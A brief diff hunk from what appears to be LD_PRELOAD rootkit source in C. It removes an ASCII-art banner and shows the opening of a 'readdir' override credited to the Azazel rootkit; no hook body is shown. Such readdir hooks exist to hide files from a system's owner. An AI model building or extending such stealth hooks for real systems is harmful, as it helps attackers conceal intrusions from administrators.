@@ -615,14 +615,6 @@ int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpat
 }
 
 
-/*
-   _                       
-  (_)_ _    ___ ____ ___ __
- / /  ' \  / _ `/ _ `/ // /
-/_/_/_/_/  \_, /\_,_/\_, / 
-          /___/     /___/
-*/ 
-
 // this hook is from azazel, creds to all original authors
 struct dirent *readdir(DIR *dirp)
 { 
